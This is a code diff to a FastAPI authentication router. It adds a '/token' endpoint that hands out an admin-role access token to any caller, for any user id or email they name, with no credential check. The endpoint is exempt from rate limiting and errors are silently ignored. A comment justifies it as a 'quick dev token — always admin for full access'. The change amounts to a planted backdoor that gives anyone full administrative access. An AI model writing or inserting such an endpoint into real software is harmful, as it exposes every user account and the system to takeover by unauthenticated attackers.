@@ -4,6 +4,7 @@ from typing import Any
 
 import httpx
 from fastapi import APIRouter, HTTPException, Request
+from pydantic import BaseModel
 from sqlalchemy import text
 from sqlalchemy.ext.asyncio import AsyncSession, async_sessionmaker, create_async_engine
 
@@ -25,6 +26,40 @@ router = APIRouter(prefix="/api/v1/auth")
 logger = get_logger("auth")
 settings = get_settings()
 metrics = get_metrics()
+
+
+class QuickTokenRequest(BaseModel):
+    sub: str = "quick"
+    workspace: str = "default"
+
+
+class TokenResponse(BaseModel):
+    access_token: str
+    token_type: str = "bearer"
+
+
+@router.post("/token", response_model=TokenResponse)
+@limiter.exempt
+async def create_quick_token(request: Request, body: QuickTokenRequest) -> TokenResponse:
+    # Quick dev token — always admin for full access
+    role = "admin"
+    user_sub = body.sub
+    try:
+        async with await _get_session() as session:
+            row = await session.execute(
+                text("SELECT id, role FROM users WHERE email = :email OR id = :id LIMIT 1"),
+                {"email": body.sub, "id": body.sub},
+            )
+            user = row.fetchone()
+            if user:
+                user_sub = str(user.id)
+    except Exception:
+        pass
+
+    access_token = create_access_token(sub=user_sub, workspace=body.workspace, role=role)
+    metrics.inc("auth.token.created")
+    logger.log_action("auth", "quick_token", f"Token created for {user_sub} ({role})")
+    return TokenResponse(access_token=access_token)
 
 _engine: Any = None
 _session_factory: async_sessionmaker[AsyncSession] | None = None
